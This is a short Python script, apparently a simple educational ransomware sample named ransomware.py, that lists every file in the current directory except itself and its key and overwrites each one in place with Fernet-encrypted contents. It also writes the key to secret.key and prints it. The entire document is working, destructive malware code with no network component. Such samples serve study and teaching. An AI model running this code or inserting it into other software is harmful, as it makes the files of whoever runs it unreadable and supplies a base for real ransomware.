import os
from cryptography.fernet import Fernet


def list_files_to_encrypt(exclude_files):
    files = []
    for file in os.listdir():
        if file in exclude_files:
            continue
        if os.path.isfile(file):
            files.append(file)
    return files


def generate_and_save_key(key_filename="secret.key"):
    key = Fernet.generate_key()
    with open(key_filename, "wb") as key_file:
        key_file.write(key)
    return key


def load_key(key_filename="secret.key"):
    with open(key_filename, "rb") as key_file:
        return key_file.read()


def encrypt_files(files, key):
    for file in files:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        content_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(content_encrypted)
        print(f"[SUCCESS] {file} encrypted successfully.")


def main():
    exclude_files = ["ransomware.py", "ransomware_decrypted.py", "secret.key"]

    files = list_files_to_encrypt(exclude_files)
    print(f"Files to encrypt: {files}")

    key = generate_and_save_key()
    print(f"Encryption key generated and saved: {key}")

    encrypt_files(files, key)


if __name__ == "__main__":
    main()
